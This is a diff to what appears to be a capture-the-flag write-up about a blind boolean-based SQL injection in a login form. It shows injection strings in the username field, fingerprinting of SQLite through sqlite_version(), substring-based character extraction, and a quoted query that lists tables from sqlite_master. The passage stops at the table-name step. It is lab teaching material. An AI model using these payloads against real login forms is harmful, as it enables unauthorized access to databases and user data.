@@ -42,6 +42,40 @@ user not found
 And from the challenge name i got that it might be blind sqli 
 
 so i typed ```aboelnour"``` in username and ```0``` in pass , i have got internal server error.
-then i typed ```aboelnour" or 1=1 -- -``` and boom i have got response ```Wrong Password```
+then i typed ```aboelnour" or 1=1 -- -``` and B00M i have got response ```Wrong Password```  , to make sure i tried ```aboelnour" or 1=0 -- -``` and got response ```User not found``` , so it is boolean based sqli 
+
+so let's enum our sql type 
+
+i tried ```aboelnour" select version()-- -``` but i got internal server error 
+
+so i tried ```aboelnour" select sqlite_version()-- -``` , and response was Wrong password , so our db is ```SQLite``` 
+
+
+## Extract table name  
+
+First of all , we have SQL Server SUBSTRING() Function , this function use to extracts some characters from a string. 
+
+Ex :
+
+substring("Aboelnour",1,1) , output will be --> A
+
+substring("Aboelnour",2,1) , output will be --> b 
+
+and so on 
+
+so if we have table name = users and column name = user we can enum users with query like this 
+
+substring((select user from users where user like '%a%'),1,1) = 'a'
+
+so let how to extract tables from sqlitedb and found this payloads in payloadsALLTheThings on github : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-version
+
+### Extract table name
+```
+SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+```
+
+
+
+
 
 
